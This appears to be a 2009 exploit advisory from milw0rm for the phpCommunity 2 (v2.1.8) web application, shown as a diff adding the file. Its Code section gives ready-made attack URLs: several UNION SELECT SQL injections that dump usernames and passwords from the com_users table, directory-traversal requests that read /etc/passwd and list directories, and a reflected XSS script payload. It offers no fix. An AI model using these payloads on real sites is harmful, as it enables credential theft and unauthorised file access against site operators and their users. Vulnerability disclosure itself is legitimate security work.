@@ -1,0 +1,104 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: phpCommunity 2
+[+] Version: 2.1.8
+[+] Website: http://sourceforge.net/projects/phpcommunity2/
+
+[+] Bugs: [A] Multiple SQL Injection
+          [B] Directory Traversal
+          [C] Reflected XSS
+
+[+] Exploitation: Remote
+[+] Date: 07 Mar 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+This web application presents several vulnerabilities
+which can be exploited to obtain reserved information.
+The following are examples of vulnerabilities 
+discovered in this application.
+
+
+- [A] Multiple SQL Injection
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: module/forum/class_forum.php
+                   module/forum/class_search.php
+
+This bug allows a guest to view username and
+password of a registered user.
+
+
+- [B] Directory Traversal
+
+[-] Requisites: none
+[-] File affected: module/admin/files/show_file.php,
+                   module/admin/files/show_source.php
+
+This bug allows a guest to read arbitrary files and 
+directory on the web server.
+
+
+- [C] Reflected XSS
+
+[-] Requisites: none
+[-] File affected: templates/1/login.php
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Multiple SQL Injection
+
+http://www.site.com/path/index.php?n=guest&c=0&m=forum&s=1&forum_id=-1' UNION ALL SELECT 1,2,CONCAT(nick, 0x3a, pwd),4,5,6,7,8 FROM com_users%23
+
+http://www.site.com/path/index.php?n=guest&c=0&m=forum&s=2&forum_id=0&topic_id=-1' UNION ALL SELECT GROUP_CONCAT(CONCAT(nick, 0x3a, pwd)) FROM com_users%23
+
+http://www.site.com/path/index.php?n=guest&c=0&m=search&s=id&wert=-1%25" UNION ALL SELECT CONCAT(nick, 0x3a, pwd),2 FROM com_users%23
+
+http://www.site.com/path/index.php?n=guest&c=0&m=search&s=nick&wert=-1%25" UNION ALL SELECT CONCAT(nick, 0x3a, pwd),2 FROM com_users%23
+
+http://www.site.com/path/index.php?n=guest&c=0&m=search&s=forum&wert=-1%25" UNION ALL SELECT 1,2,3,4,CONCAT(nick, 0x3a, pwd),6 FROM com_users%23
+
+
+- [B] Directory Traversal
+
+http://www.site.com/path/module/admin/files/show_file.php?file=../../../../../../../../etc/passwd
+
+http://www.site.com/path/module/admin/files/show_source.php?path=/etc
+
+
+- [C] Reflected XSS
+
+http://www.site.com/path/templates/1/login.php?msg=<script>alert('XSS');</script>
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-03-09]
